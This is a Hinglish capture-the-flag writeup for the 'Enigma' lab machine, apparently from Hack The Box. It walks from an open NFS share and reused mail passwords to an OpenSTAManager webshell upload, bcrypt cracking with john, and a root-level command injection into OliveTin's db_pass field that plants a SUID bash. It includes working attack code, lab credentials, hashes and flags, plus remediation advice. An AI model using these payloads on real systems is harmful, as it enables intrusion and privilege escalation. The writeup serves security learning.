# Enigma — Writeup

| Field | Value |
|-------|-------|
| **Machine** | Enigma |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Released** | Active (ID 915) |
| **IP** | 10.129.239.191 (VPN `tun0`) |
| **Owned** | 2026-09-27 — User ✅ Root ✅ |
| **Time** | ~30 minutes |

**Attack path (TL;DR):**

```text
nmap → mail (Dovecot) + NFS + nginx vhosts
     → NFS world-readable share → New_Employee_Access.pdf → kevin mail creds
     → sarah mailbox (same password) → OpenSTAManager admin creds
     → OSM v2.9.8 CVE-2026-38751 module upload → www-data RCE
     → DB creds → haris bcrypt hash → john → "bestfriends" → su → user.txt
     → OliveTin (root, localhost:1337) → sirf haris allowed (uid firewall)
     → ConnectRPC API → db_pass command injection → root → root.txt
```

---

## 1. The Thought Process (dimaag kaise chala)

Nmap ke baad **4 alag surfaces** mile — ab sochne ka sawaal tha:
**kahan pehle jaun?**

| Surface | Soch |
|---------|------|
| 22 SSH | Password auth band (publickey) — bina creds ke andar nahi |
| 80 nginx | Vhost redirect (`enigma.htb`) — web apps mein logical errors sabse promising |
| 110/143 mail | **Creds maangta hai** — creds mile toh inbox = info goldmine |
| 2049 NFS | File share — **world-readable export dikha (`*`)** = pehle yeh! File system seedha khulta hai, auth nahi chahiye |

**Parallel chalao** — NFS mount + web enum ek saath (doosra banda time
aapas mein waste karta hai). NFS mein `New_Employee_Access.pdf` mili →
PDF = HR/IT documents = **credentials ka sabse common dump**.

PDF se kevin creds → Roundcube vhost (`mail001`) mila → par **POP3
plain auth reject hua** → turant **IMAP SSL (993)** pe switch (same
creds, secure channel — server plaintext ko mana kar raha tha, MATLAB
creds valid ho sakte hain!).

kevin ka inbox = welcome mail (kuch nahi). Par **kevin ka password
sarah pe bhi try kiya** (password reuse ka idea — sabse common weak
pattern) → **sarah ka inbox khula** → OSM admin creds.

OSM = OpenSTAManager → version note kiya (**2.9.8**) → web pe search:
"OpenSTAManager2.9 RCE" → **CVE-2026-38751 exact version fit** →
authenticated module upload RCE. Yahan mushkil "exploit banana" nahi
tha — **version→CVE match** hi asli skill thi.

www-data ke baad **privesc sochne ka order:**
1. sudo/SUID/capabilities → nahi mile (standard)
2. OSM config se DB creds mile → `zz_users` table → **haris ka bcrypt
   hash** → john (rockyou) → `bestfriends`2 second mein
3. `su haris` → user flag
4. Root ke liye recon → **`/usr/local/bin/OliveTin` root process** dikha
   + config mein **Backup Database action** with `db_pass` interpolation
   → command injection ka idea seedha mila
5. Bas **kaise API tak pahunchein** (localhost:1337) — woh debugging
   tha (Dead Ends section)

## 2. Recon

```bash
htb machine spawn enigma
nmap -sC -sV -p- --min-rate 1500 -oA recon 10.129.239.191
```

```text
-p-           : saare65535 ports (fixed list pe bharosa mat karo)
--min-rate 1500 : kam se kam1500 packets/sec — full scan fast khatam ho
-oA recon     : output teen files mein save
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH 9.6 | password auth **band** |
| 80 | nginx | 302 → `enigma.htb` (vhost — hosts file mein daalo!) |
| 110/143/993/995 | Dovecot | mail (SSL versions bhi hain = creds chal sakte hain) |
| 2049 + rpc | NFS | `showmount -e` → `/srv/nfs/onboarding *` (sabke liye!) |

```bash
echo "10.129.239.191 enigma.htb mail001.enigma.htb support_001.enigma.htb" >> /etc/hosts
showmount -e 10.129.239.191
```

```text
showmount -e : NFS server se "kaunsi shares kiske liye hain" list maango
-e           : exports list
```

## 3. Dead Ends (kya try kiya, kya fail hua)

> Is box ka asli time yahin gaya — aur yahi lessons hain:

1. **NFS mount direct fail:**
   `mount: Operation not permitted` — humara Docker container
   `CAP_SYS_ADMIN` ke bina aata hai, mount syscall chahiye hi.
   → **Fix:** doosra *privileged* container chalao jo humare network
   namespace (`--network container:kali`) mein mount kar sake. Mounted
   share ko `docker exec cat` se bahar nikaala.

2. **POP3 login reject:**
   `Plaintext authentication disallowed on non-secure connections`
   → POP3 (110) plain tha, **IMAP SSL (993)** try kiya — chal gaya.
   *Lesson: auth reject ≠ creds galat. Channel galat ho sakta hai.*

3. **`su` pipe se fail:**
   `echo pass | su - haris -c id` → hamesha `Authentication failure`.
   Asli wajah: **`su` TTY (terminal) maangta hai**, pipe se password
   padhta hi nahi.
   → **Fix:** target pe Python `pty.fork()` — asli terminal jaisa
   banake password bheja → turant chal gaya.
   *Ye beginner ka #1 trap hai — error message galat direction deta hai.*

4. **sudo password attempts fail** — teeno known passwords galat the,
   `sudo -n -l` se pata chala haris sudoers mein hai hi nahi.

5. **`www-data` se OliveTin :1337 timeout:**
   `ss` mein LISTEN dikh raha tha par TCP connect hi nahi ho raha tha.
   Lag raha tha service dead hai.
   → Debug: `3306 OK / 1337 FAIL` (www-data) vs `1337 OK` (**haris**)
   → **uid-based OUTPUT firewall** tha. *Service ka chalna zaroori
   nahi — kaun chala sakta hai woh bhi rule hai.*

6. **OliveTin API ke galat field names** (3 rounds):
   - Path `/olivetin.api...` → HTML mila (SPA fallback) → asli path
     **`/api/olivetin.api.v1...`** (probe se mila)
   - `{"actionId":...}` → "action ID  not found" (empty) → proto
     padhi: field **`binding_id`** tha, `action_id` nahi!
   - Ek baar meri payload quoting toot gayi → injection **API ke bajaye
     local shell mein chal gaya** (SUID ban gaya par root ka nahi)
   → **Fix:** GitHub se asli `.proto` file padhi + bodies base64 se
   bheji.

## 4. Vulnerability ELI5

**NFS world-readable export:**

> Office ki file cupboard bina lock ke khuli padi hai aur building ka
> guard (`*` export) kisi ko bhi andar aane deta hai. NFS share mein
> `*` = koi bhi IP wala banda khole.

**Password reuse:**

> Tumne ghar, bike aur office teeno ke liye ek hi key banwai. Ek jagah
> khona = teeno jagah gaya. Yahan `Enigma2024!` kevin=sarah=mail mein,
> OSM alag tha par chain wahi chali.

**Command Injection (OliveTin `db_pass`):**

> Receptionist boss kehti hai: "password bolo, main mysqldump command
> mein daal ke chalati hoon." Tumne bola:
> `x'; rm -rf boss; #` — aur usne bina soche apne *poore command*
> mein chipka diya. `#` ke baad ka poora "boss ka baaki order" kaat
> gaya — chala **sirf tumhara**.

**UID firewall (localhost:1337):**

> Lift sirf staff ke liye hai — customer (www-data) dabao toh door
> band, office wali (haris) dabao toh khul jaati hai. Port bahar se
> band nahi tha, **andar jaane wale ki pehchaan** check ho rahi thi.

**OliveTin = root ka remote control:**

> Office ka woh attendant hai jiske paas **boss ka asli master key**
> hai (root) aur wo koi bhi predefined button daba ke commands chalata
> hai. Humne uske button mein apna order chipka diya.

## 5. Exploitation

### NFS → PDF → creds

Container mount cap ke bina — privileged sidecar:

```bash
docker run -d --rm --network container:kali --privileged --name nfsdump \
  kalilinux/kali-rolling sleep 7200
docker exec nfsdump mount -t nfs -o nolock,vers=3,addr=10.129.239.191 \
  10.129.239.191:/srv/nfs/onboarding /mnt/x
docker exec nfsdump cat /mnt/x/New_Employee_Access.pdf > /tmp/
pdftotext /tmp/New_Employee_Access.pdf -
```

```text
--network container:kali : humare VPN (tun0) wale network mein chal —
                           target sirf wahan se dikhta hai
-o nolock,vers=3         : lock service chhod do + NFSv3 (compat)
pdftotext -              : PDF ka text stdout pe (binary mat padho)
```

```text
URL: http://mail001.enigma.htb   Username: kevin   Password: Enigma2024!
```

### Mailbox hopping

POP3 plain reject → IMAP SSL:

```python
M = imaplib.IMAP4_SSL('10.129.239.191', 993)
M.login('kevin', 'Enigma2024!')   # welcome mail — kuch nahi
M.login('sarah', 'Enigma2024!')   # reuse try → INBOX mila!
```

Sarah ke inbox mein:

```text
OpenSTAManager → http://support_001.enigma.htb
admin : Ne3s4rtars78s
```

### OpenSTAManager → www-data (CVE-2026-38751)

Version **2.9.8** (CSS `app.min.css?v=2.9.8` se) → CVE search →
**module update upload = arbitrary PHP**:

```python
#1. login
s.post(t + '/index.php?op=login', data={'username': 'admin', 'password': 'Ne3s4rtars78s'})
#2. module updates enable (warna upload endpoint kaam nahi karta)
s.post(t + '/ajax.php?a=check_module_updates_settings', data={'Attiva aggiornamenti': '1'})
#3. ZIP = shell/MODULE (definition) + shell/shell.php (webshell)
#4. upload → /modules/aggiornamenti/upload_modules.php
#5. RCE
requests.get(t + '/modules/shell/shell.php', params={'c': 'id'})
# uid=33(www-data)
```

**Why it worked:** app ne ZIP ke andar ke files par koi extension/content
check nahi kiya — module install = root of trust, wahan PHP rakh diya.

### www-data → haris (john)

```bash
cat /var/www/html/openstamanager/config.inc.php
# $db_username='brollin'; $db_password='Fri3nds@9099';

mysql -ubrollin -p'Fri3nds@9099' openstamanager -N -e 'SELECT username,password FROM zz_users'
# haris: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC

echo '$2y$10$WHf1...' > haris.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
# bestfriends  (2 seconds!)
```

```text
-N : table headers/rubbish hatao — sirf values
--format=bcrypt : hash type force karo ($2y$ = bcrypt) — auto-detect
                  pehla hi hash often galat category mein jaata hai
```

`su` ko TTY chahiye — Python `pty` trick:

```python
pid, fd = pty.fork()                    # asli terminal banao
if pid == 0:
    os.execvp('su', ['su', '-', 'haris', '-c', 'cat /home/haris/user.txt'])
else:
    time.sleep(0.8)
    os.write(fd, b'bestfriends\n')      # password TTY pe bhejo
```

```
ff4d8e92f6f456fcec6e70019cbdd97e   ← user flag
```

### haris → root (OliveTin API injection)

Recon: `ps aux` → `/usr/local/bin/OliveTin` **root** mein.
Config `/etc/OliveTin/config.yaml`:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - {name: db_pass, type: password}   # FREE TEXT — single quotes ke andar!
```

**Blocker:** :1337 sirf non-root se block (uid firewall) → **haris ke
session se** call karna hai. OliveTin = **ConnectRPC** (protobuf JSON):

```bash
# service/method binary ke strings se:
# /api/olivetin.api.v1.OliveTinApiService/StartAction
# proto (GitHub se): binding_id + arguments[{name,value}]
```

```bash
curl -s -X POST \
  -H 'Content-Type: application/json' \
  -H 'Connect-Protocol-Version: 1' \
  -d '{"binding_id":"backup_database","arguments":[
        {"name":"db_user","value":"backup_svc"},
        {"name":"db_pass","value":"x';cp /bin/bash /tmp/.rsh;chmod 4755 /tmp/.rsh;chmod o+r /tmp/.rsh;#"},
        {"name":"db_name","value":"production"}]}' \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
```

**Why it worked:** OliveTin root mein `shell:` string ko **shell ke
hawale** karta hai. `db_pass` single-quotes ke andar aata hai — humne
quote tod ke apne commands chipka diye; `#` ne baaki original command
ko comment bana diya:

```text
mysqldump -u backup_svc -p'x'; <HUMARA COMMAND>; #' production > ...
                      └ quote close  └ chal gaya  └ baaki sab gayab
```

```bash
/tmp/.rsh -p -c 'id; cat /root/root.txt'
# euid=0(root)
# 7585bea1d4d3f2351354f5f67b5a935b   ← root flag
```

```text
bash -p : SUID bash mein -p flag = "privileged mode" — warna bash
          euid ko dhank ke normal user jaisa behave karta hai
```

Cleanup: webshell, SUID bash, sidecar container — sab delete.

## 6. Flags

```text
user: ff4d8e92f6f456fcec6e70019cbdd97e
root: 7585bea1d4d3f2351354f5f67b5a935b
```

```bash
htb machine own <flag>
```

## 7. Patch / Remediation

- **NFS:** export mein `*` kabhi mat rakho — specific subnet/IP ya
  kerberos auth; `root_squash` on (root banane se pehle rokta hai).
  Sensitive files share se bahar.
- **Mail:** POP3/IMAP plaintext auth disable (done by server — sahi
  hai); **password per-user unique** → reuse chain toot jaati.
- **OSM:** version upgrade (>2.10) — module upload ab validate karta;
  admin creds strong + unique; `config.inc.php` webroot se bahar ya
  perms 640 (www-data ko DB password dikhna hi nahi chahiye tha).
- **OliveTin `shell:` injection:** arguments ko **shell-escape** karo
  (Go mein `shlex.Quote` jaisa) ya `exec:` array form use karo (args
  alag rehte hain, shell parsing nahi hoti). Password args ko log/API
  response mein mat echo karo.
- **API auth:** `authRequireGuestsToLogin: true` + per-action
  permissions — uid firewall theek tha par app-level auth bhi hona
  chahiye (defense in depth).
- **Hashes:** bcrypt hai ✓ (crack hua kyunki password weak tha —
  complexity policy + password manager yahan bhi laagu karo).

## Key takeaways

1. **Auth error ≠ dead end** — POP3 reject ke baad IMAP SSL try kiya;
   creds sahi the, channel galat tha.
2. **`su` ka TTY trap** — pipe-fail ko "wrong password" mat samjho;
   `pty.fork()` ya `script -qec` hi jawab hai.
3. **Version note karo → CVE search** — OSM2.9.8 = exact-fit vuln,
   exploit banana nahi padha.
4. **`strings` + official source** — unknown service ka API guess mat
   karo: binary strings se method, GitHub se `.proto`.
5. **Firewall ka sawaal "port open" nahi, "kaun" hai** — `ss` LISTEN
   dikhata hai, connect kis uid se hoga woh test karo.

## Final Checklist

- [x] Naya banda flags/syntax samajh payega? (har flag toda)
- [x] Shaq kaise hua — har pehla kadam explain kiya? (web vs nfs order,
      IMAP switch, version→CVE)
- [x] Commands ka order = actual terminal order? ✓ (aur jo fail hua
      woh alag section mein)

## Tools used

`nmap` · `showmount` · docker privileged sidecar · `pdftotext` ·
`imaplib` · `mysql` · `john` · python `pty` · `curl` (ConnectRPC) ·
`htb` CLI
